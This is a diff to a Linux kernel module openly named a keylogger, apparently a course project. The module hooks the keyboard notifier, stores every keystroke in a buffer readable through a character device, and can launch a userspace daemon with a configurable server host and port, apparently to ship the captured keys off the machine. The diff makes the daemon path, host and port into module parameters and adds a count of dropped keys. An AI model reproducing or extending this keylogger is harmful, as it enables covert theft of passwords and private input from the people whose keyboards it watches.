@@ -1,5 +1,6 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/moduleparam.h>
 #include <linux/init.h>
 #include <linux/device.h>
 #include <linux/keyboard.h>
@@ -14,14 +15,25 @@
 
 MODULE_LICENSE("GPL");              /* General Public License - required by keyboard_notifier */
 
-static int major;                   /* major number assigned to device driver */
-static struct class*  keyloggerClass  = NULL;
-static struct device* keyloggerDevice = NULL;
+static char *daemon;
+static char *host = "127.0.0.1";
+static char *port = "2000";
 
-static char dev_buffer[BUFFER_LEN];
-static short begin = 0;
-static short end = 0;
-static short
+module_param(daemon, charp, 0000);
+MODULE_PARM_DESC(daemon, "Path to daemon executable file");
+module_param(host, charp, 0000);
+MODULE_PARM_DESC(host, "Server address");
+module_param(port, charp, 0000);
+MODULE_PARM_DESC(port, "Server port");
+
+static int major;                   /* major number assigned to device driver */
+static struct class *keyloggerClass;
+static struct device *keyloggerDevice;
+
+static unsigned char dev_buffer[BUFFER_LEN];
+static unsigned short begin = 0;
+static unsigned short end = 0;
+static unsigned char omittedKeys = 0;
 
 /* The prototype functions for the character driver */
 static int     device_open(struct inode *, struct file *);
@@ -42,10 +54,11 @@ static int is_device_full(void)
     return (end + 1) % BUFFER_LEN == begin;
 }
 
-int start_deamon(void)
+static int start_deamon(void)
 {
     struct subprocess_info *sub_info;
-    char *argv[] = {"/media/sf_uxp-shared/deamon", "127.0.0.1", "2000", NULL};
+
+    char *argv[] = {daemon, host, port, NULL};
     static char *envp[] = {
             "HOME=/",
             "TERM=linux",
@@ -60,26 +73,42 @@ int start_deamon(void)
     return call_usermodehelper_exec(sub_info, UMH_WAIT_EXEC);
 }
 
-int log_key(struct notifier_block *nblock, unsigned long code, void *_param)
+static int log_key(struct notifier_block *nblock, unsigned long code, void *_param)
 {
     struct keyboard_notifier_param *param = _param;
 
-    if (code == KBD_KEYCODE)
+    if (code != KBD_KEYCODE)
     {
-        if (!is_device_full())
+        /* log keys only coming from keyboard */
+        return NOTIFY_OK;
+    }
+
+    mutex_lock(&keyloggerDevice->mutex);
+
+    if (!is_device_full())
+    {
+        if (omittedKeys)
         {
-            mutex_lock(&keyloggerDevice->mutex);
-            dev_buffer[end] = (char) param->down;
+            dev_buffer[end] = (unsigned char) 2;
             end = (end + 1) % BUFFER_LEN;
-            dev_buffer[end] = (char) (param->value);
+            dev_buffer[end] = (unsigned char) omittedKeys;
             end = (end + 1) % BUFFER_LEN;
-            mutex_unlock(&keyloggerDevice->mutex);
+            omittedKeys = 0;
         }
         else
         {
-
+            dev_buffer[end] = (unsigned char) param->down;
+            end = (end + 1) % BUFFER_LEN;
+            dev_buffer[end] = (unsigned char) param->value;
+            end = (end + 1) % BUFFER_LEN;
         }
     }
+    else if (omittedKeys < 255)
+    {
+        omittedKeys++;
+    }
+
+    mutex_unlock(&keyloggerDevice->mutex);
 
     return NOTIFY_OK;
 }
@@ -118,7 +147,8 @@ static int __init keylogger_init(void)
     register_keyboard_notifier(&nb);
     mutex_init(&keyloggerDevice->mutex);
 
-    return start_deamon();
+    //start_deamon()
+    return 0;
 }
 
 static void __exit keylogger_exit(void)
@@ -135,10 +165,11 @@ module_exit(keylogger_exit);
 
 static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset)
 {
+    unsigned short bytes_read;
+    printk(KERN_ALERT "read \n");
     mutex_lock(&keyloggerDevice->mutex);
 
     /* copy data from the kernel data segment to the user data segment */
-    unsigned short bytes_read;
     for (bytes_read = 0; begin != end && bytes_read <= length; begin = (begin + 1) % BUFFER_LEN, ++bytes_read)
     {
         put_user(dev_buffer[begin], buffer + bytes_read);
@@ -157,10 +188,12 @@ static ssize_t device_write(struct file *filp, const char *buff, size_t len, lof
 
 static int device_open(struct inode *inode, struct file *file)
 {
+    printk(KERN_ALERT "open\n");
     return 0;
 }
 
 static int device_release(struct inode *inode, struct file *file)
 {
+    printk(KERN_ALERT "release\n");
     return 0;
 }
